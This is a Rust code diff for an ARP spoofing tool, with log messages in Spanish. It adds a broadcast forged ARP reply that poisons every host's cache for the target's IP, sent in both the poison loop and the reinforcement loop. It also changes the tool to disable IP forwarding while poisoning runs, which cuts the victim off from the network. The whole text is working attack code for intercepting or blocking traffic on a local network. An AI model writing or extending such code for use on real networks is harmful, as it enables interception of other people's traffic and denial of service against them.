@@ -350,10 +350,20 @@ fn run_poison_loop(
         context.gateway_ip,
     );
 
+    let mut gateway_broadcast_packet = [0u8; 42];
+    build_arp_reply(
+        &mut gateway_broadcast_packet,
+        context.local_mac,
+        target_ip,
+        PnetMacAddr::broadcast(),
+        context.gateway_ip,
+    );
+
     if aggressive {
         for _ in 0..20 {
             let _ = tx.send_to(&target_packet, None);
             let _ = tx.send_to(&gateway_packet, None);
+            let _ = tx.send_to(&gateway_broadcast_packet, None);
             std::thread::sleep(Duration::from_millis(20));
         }
     }
@@ -361,6 +371,7 @@ fn run_poison_loop(
     while running.load(Ordering::Relaxed) {
         let _ = tx.send_to(&target_packet, None);
         let _ = tx.send_to(&gateway_packet, None);
+        let _ = tx.send_to(&gateway_broadcast_packet, None);
         std::thread::sleep(interval);
     }
 
@@ -411,9 +422,19 @@ fn reinforce_poisoning(
         context.gateway_ip,
     );
 
+    let mut gateway_broadcast_packet = [0u8; 42];
+    build_arp_reply(
+        &mut gateway_broadcast_packet,
+        context.local_mac,
+        target_ip,
+        PnetMacAddr::broadcast(),
+        context.gateway_ip,
+    );
+
     for _ in 0..5 {
         let _ = tx.send_to(&target_packet, None);
         let _ = tx.send_to(&gateway_packet, None);
+        let _ = tx.send_to(&gateway_broadcast_packet, None);
         std::thread::sleep(Duration::from_millis(40));
     }
 
@@ -677,17 +698,21 @@ impl ArpSpoofer {
             logs.push("block_mode desactivado: no se aplicó regla de firewall".to_string());
         }
 
-        if settings.block_mode {
+        if settings.poison_enabled {
             let mut state_guard = self.ip_forward_state.lock().await;
             if state_guard.is_none() {
-                let previous = ip_forwarding::enable().await?;
-                logs.push("Reenvio IP habilitado temporalmente".to_string());
+                let previous = ip_forwarding::disable().await?;
+                match previous.as_deref().map(str::trim) {
+                    Some("0") => logs.push("Reenvio IP ya estaba deshabilitado".to_string()),
+                    Some("1") => logs.push("Reenvio IP deshabilitado temporalmente".to_string()),
+                    _ => logs.push("Reenvio IP sin cambios".to_string()),
+                }
                 *state_guard = previous;
             } else {
-                logs.push("Reenvio IP ya activo".to_string());
+                logs.push("Reenvio IP ya se encuentra gestionado".to_string());
             }
         } else {
-            logs.push("block_mode desactivado: reenvio IP sin cambios".to_string());
+            logs.push("Envenenamiento ARP deshabilitado: reenvio IP sin cambios".to_string());
         }
 
         let mut spoof_control = None;
